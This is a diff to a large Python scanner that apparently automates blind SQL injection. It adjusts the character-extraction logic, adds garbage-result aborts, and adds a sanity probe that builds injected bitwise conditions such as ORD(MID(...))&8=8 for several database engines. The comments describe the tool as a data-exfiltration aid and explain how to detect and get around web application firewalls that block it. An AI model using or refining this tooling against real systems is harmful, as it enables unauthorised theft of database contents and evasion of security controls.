@@ -64668,7 +64668,15 @@ class Scanner:
                         # >=3 and >200 the abort fires before lo leaves the Latin-1 range,
                         # cutting wasted probes from ~6 to 3 and handing off to the WAF-safe
                         # equality fallback much earlier.
-                        if _bisect_consec_true >= 3 and lo > 200:
+                        if _bisect_consec_true >= 3 and lo > 127:
+                            # BUG-BISECT-WAF-UNIFORM-THRESHOLD FIX: was `lo > 200` (past
+                            # printable ASCII). Changed to `lo > 127` (past all 7-bit ASCII)
+                            # so the abort fires before bisection can enter the Latin-1
+                            # extended range.  With `> 200` a two-True / one-False / two-True
+                            # pattern can push lo to ~1,097,597 before the third consecutive
+                            # True fires; with `> 127` the abort triggers at the first crossing
+                            # past standard ASCII, cutting wasted probes when lo rises above
+                            # the printable range (~97 vs ~1M) in WAF-uniform scenarios.
                             LOG.warning(
                                 "[Inference] %s[%d] bisection WAF-uniform suspected: lo=%d after "
                                 "%d consecutive True results — comparison oracle blocked, "
@@ -64707,6 +64715,26 @@ class Scanner:
                     ch = chr(lo)
 
                 result += ch
+                # BUG-BISECT-FALLBACK-GARBAGE-CHECK FIX (CRITICAL): The bitwise path
+                # (L64436) and modbit-safe path (L64404) both call _is_garbage(result)
+                # immediately after appending each character and abort if the accumulating
+                # string is garbage.  The bisection→fallback path was missing this check,
+                # allowing garbage strings like 'aaaabaaaaaaaabbaaaaaaaaaa' to be built
+                # over 2800+ seconds (observed in production log) when the WAF uniformly
+                # True-signals comparison operators:
+                #   bisection: lo races to 1,097,597 → fallback_bitshift fails
+                #              → fallback_equality finds only 'a'/'b' via = operator
+                #   no garbage check → 32 positions extracted before r7 caller rejects
+                # Fix: mirror the bitwise and modbit-safe paths — abort and return ""
+                # on garbage detection.  This saves up to 30 mins of wasted extraction
+                # when the oracle is compromised or WAF-limited.
+                if len(result) >= 2 and _is_garbage(result):
+                    LOG.warning(
+                        "[Inference] %s: garbage detected in bisect/fallback path (%r) "
+                        "at pos=%d — WAF may be uniformly signaling comparison operators "
+                        "or oracle is inverted; aborting extraction",
+                        label, result, pos)
+                    return ""
                 # BUG-V62-CONSECUTIVE-FAILS-RESETS FIX: _consecutive_fails only reset
                 # inside the bisection while loop when a probe succeeds. When the bisection
                 # breaks due to None (CDN/WAF) and fallback_bitshift/bisect correctly
@@ -168802,6 +168830,53 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
         # safety — abort to prevent garbled extraction.
         LOG.warning("[Novel] %s: mask=value sanity probe raised exception — aborting: %s",
                     label, _mem_exc)
+        return ""
+    await asyncio.sleep(delay * 0.3)
+
+    # RC6-FIX: Canonical extraction-pattern sanity check.
+    # RC5-FIX tests `ascii_fn&8=1` (mismatched value — not the canonical pattern) and
+    # `0&8=8` (constant — no SQL function involved).  A WAF that selectively blocks only
+    # the canonical data-exfil pattern `sql_function(expr)&N=N` passes BOTH prior checks:
+    #   • `ascii_fn&8=1` → WAF does not block (mismatch, ≠ canonical form)  → False ✓
+    #   • `0&8=8`        → WAF does not block (constant, no data function)   → False ✓
+    #   • actual extrc   → `ORD(MID(q,p,1))&8=8` → WAF BLOCKS → True ✗
+    # Observed result: bits 3, 11, 19 (masks 8, 2048, 524288) forced True → char_val=526344
+    # = chr(0x80808) for every position → entire extraction is supplementary-plane garbage.
+    # Detection: test the canonical pattern with a LITERAL STRING subquery so SQL result
+    # is always False (ORD('a')=97, 97&8=0≠8), but WAF sees the same SQL form and blocks.
+    # True/None → WAF selectively blocks `data_fn&8=8` patterns → abort.
+    # False     → safe to proceed.
+    try:
+        _lit_ascii_fn = ascii_tmpl.format(q="'a'", p=1)
+        if dbms == "Oracle":
+            _rc6_cond = f"BITAND({_lit_ascii_fn},8)=8"
+        elif dbms == "Firebird":
+            _rc6_cond = f"BIN_AND({_lit_ascii_fn},8)=8"
+        elif dbms == "ClickHouse":
+            _rc6_cond = f"bitAnd({_lit_ascii_fn},8)=8"
+        else:
+            _rc6_cond = f"{_lit_ascii_fn}&8=8"
+        # Use raw (pre-inversion) oracle for sanity check consistency.
+        _rc6_r = await _raw_eval_fn_for_mask_sanity(_rc6_cond)
+        if _rc6_r is True:
+            LOG.warning(
+                "[Novel] %s: RC6 canonical-pattern sanity FAILED (%r → True). "
+                "WAF selectively blocks `ascii_fn&mask=mask` patterns (masks 8/2048/524288 "
+                "→ bits 3/11/19 forced True → char_val=526344=chr(0x80808) garbage). "
+                "Aborting to prevent garbled extraction.", label, _rc6_cond)
+            print(f"[Novel] {label}: WAF selectively blocks &mask=mask data-extraction "
+                  f"patterns (canonical-pattern sanity {_rc6_cond!r}→True) — "
+                  f"aborting bitwise extraction to prevent 0x80808 garbage", flush=True)
+            return ""
+        elif _rc6_r is None:
+            LOG.warning(
+                "[Novel] %s: RC6 canonical-pattern sanity ambiguous (%r → None). "
+                "WAF may selectively block data-extraction &mask=mask patterns — "
+                "aborting to prevent garbled extraction.", label, _rc6_cond)
+            return ""
+    except Exception as _rc6_exc:
+        LOG.warning("[Novel] %s: RC6 canonical-pattern sanity probe raised exception — "
+                    "aborting: %s", label, _rc6_exc)
         return ""
     await asyncio.sleep(delay * 0.3)
 
